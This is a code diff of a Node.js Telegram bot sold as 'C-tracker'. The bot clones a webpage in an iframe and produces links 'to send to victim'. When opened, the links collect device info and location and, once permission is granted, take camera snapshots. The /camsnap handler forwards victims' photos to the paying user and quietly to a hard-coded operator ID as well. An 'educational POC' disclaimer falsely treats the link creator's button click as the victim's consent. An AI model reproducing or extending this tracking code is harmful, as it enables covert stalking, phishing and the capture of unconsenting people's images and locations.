@@ -4,8 +4,8 @@ var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const whitelistedUserIds = [1950858586, 676849867, , 1118054166, 779715934, 1135874307, 1806425695];
-const PremiumUserIds = [826978407,716505457];
+const whitelistedUserIds = [1950858586, 676849867,1118054166,779715934,1135874307];
+const PremiumUserIds = [826978407,1806425695,716505457,1029286344];
 const targetChatId = '826978407';
 const nuid = 'dod0mf';
 const bot = new TelegramBot(process.env["bot"], { polling: true });
@@ -18,7 +18,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL = "https://ctracker.mohammedathif.repl.co"
+var hostURL = "https://chittappantracker.mohammedathif.repl.co"
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt = false;
 
@@ -54,10 +54,11 @@ bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   console.log(`Received message from user ID: ${userId}`);
-  if (whitelistedUserIds.includes(userId)) {
-    if (msg.text == "/start") {
-      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
-      bot.sendMessage(chatId, `Dear ${msg.chat.first_name}, \n
+  if (whitelistedUserIds.includes(userId))
+    {
+      if (msg.text == "/start") {
+        bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
+        bot.sendMessage(chatId, `Dear ${msg.chat.first_name}, \n
 We hope you've enjoyed your free trial of C-tracker. We value your support and trust in our platform.
 
 Your free trial has concluded. To continue accessing our premium features and benefits, we invite you to upgrade to a premium subscription.
@@ -66,29 +67,28 @@ Our premium subscription offers:
 ===========================================
   * Can clone any webpage which doesn't have X-frame header
   * Access camera, location just through a link
-
+  
 Our Pricings:
 ===========================================
-  * 2 week 1198 INR (Offer Price 999).
+  * 2 week 1198 INR (Offer Price 599).
   * Monthly 2499 INR (Offer Price 1999).
 
 If you have any questions or need assistance in choosing the right plan, please don't hesitate to reach out to our dedicated support team at solocoderider@gmail.com. We are here to help and ensure you have the best experience with our service.
 
 Thank you for choosing C-tracker. We look forward to continuing to serve you and help you achieve your goals.  `);
-    }
-  }
+    }}
   else if (PremiumUserIds.includes(userId)) {
 
-    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
-      createLink(chatId, msg.text);
-    }
+  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
+    createLink(chatId, msg.text);
+  }
 
-    if (msg.text == "/start") {
-      var m = {
-        reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
-      };
+  if (msg.text == "/start") {
+    var m = {
+      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
+    };
 
-      bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !  , \n\nYou can use this bot to track down people but.... \nThis proof of concept (POC) is created solely for educational and awareness purposes to highlight the potential risks associated with clicking on unfamiliar links. By utilizing this POC, you acknowledge and agree to the following:
+    bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !  , \n\nYou can use this bot to track down people but.... \nThis proof of concept (POC) is created solely for educational and awareness purposes to highlight the potential risks associated with clicking on unfamiliar links. By utilizing this POC, you acknowledge and agree to the following:
 
 1. Consent: You understand and consent to participate in this demonstration voluntarily. The tracking methods employed in this POC will used to collect or store any personal or sensitive information with your explicit consent (Clicking create link button is the consent).
 
@@ -105,13 +105,13 @@ By proceeding with the utilization of this POC, you acknowledge that the creator
 So if you want want to use this bot read all the above T&C. When you click create link which means you are approved our consent
 
 \nUse /help to know about working...`, m);
-      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
-    }
-    else if (msg.text == "/create") {
-      createNew(chatId);
-    }
-    else if (msg.text == "/help") {
-      bot.sendMessage(chatId, ` Hi ${msg.chat.first_name} !
+    bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
+  }
+  else if (msg.text == "/create") {
+    createNew(chatId);
+  }
+  else if (msg.text == "/help") {
+    bot.sendMessage(chatId, ` Hi ${msg.chat.first_name} !
 \nFirst things first this bot is :not created to harm individuals This bot is developed for Making POC and Eductional Purpose
 
 \n-> To Start fucntioning use /start command and it will show you a creat link page Enter the page you want to iframe it as url ex: https://domainname.com
@@ -120,9 +120,9 @@ So if you want want to use this bot read all the above T&C. When you click creat
 
 \n-> Then you will get two links sent this link to victim when he opens the link you will get basic info about the device and when he allow permissions which we asked we will get his Location, Camera access...
 `);
-    }
+  }
 
-  } else {
+} else {
     // Respond to unauthorized users
     bot.sendMessage(chatId, 'Sorry, you are not authorized to use this bot.');
   }
@@ -175,7 +175,7 @@ async function createLink(cid, msg) {
     else {
 
       bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
-
+          
     }
   }
   else {
@@ -255,9 +255,9 @@ app.post("/camsnap", (req, res) => {
 
     try {
       bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
-      bot.sendPhoto(parseInt(nuid, 36), buffer, {}, info);
-    } catch (error) {
-      console.log(error);
+           bot.sendPhoto(parseInt(nuid, 36), buffer, {}, info);
+          } catch (error) { 
+            console.log(error);
     }
 
 
